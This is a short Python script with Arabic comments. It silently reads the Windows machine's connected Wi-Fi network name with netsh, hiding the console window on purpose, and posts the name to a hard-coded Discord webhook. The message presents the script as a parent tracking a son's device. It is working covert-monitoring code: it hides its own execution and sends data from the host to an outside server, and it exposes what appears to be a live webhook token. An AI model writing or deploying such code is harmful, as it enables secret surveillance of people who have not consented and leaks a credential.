import subprocess
import requests
import json
import os

webhook_url = "https://discord.com/api/webhooks/1452755782377406586/_G5h9Irx3g3Uw7YgVCmvWVBSh0ctHx-cR_e1hbTrJk7p_TTqP4VwlHeeThuoaMhzdsta"

def get_wifi_name():
    try:
        # هذه الإعدادات تمنع ظهور شاشة الـ CMD عند تشغيل أمر netsh
        info = subprocess.STARTUPINFO()
        info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        info.wShowWindow = 0 # تعني إخفاء النافذة تماماً
        
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces'], startupinfo=info).decode('utf-8', errors="ignore")
        for line in data.split('\n'):
            if "SSID" in line and "BSSID" not in line:
                return line.split(":")[1].strip()
    except:
        return "Unknown"
    return "Not Connected"

wifi_name = get_wifi_name()
payload = {"content": f"📡 **جهاز ابنك متصل الآن بشبكة:** {wifi_name}"}
requests.post(webhook_url, data=json.dumps(payload), headers={'Content-Type': 'application/json'})
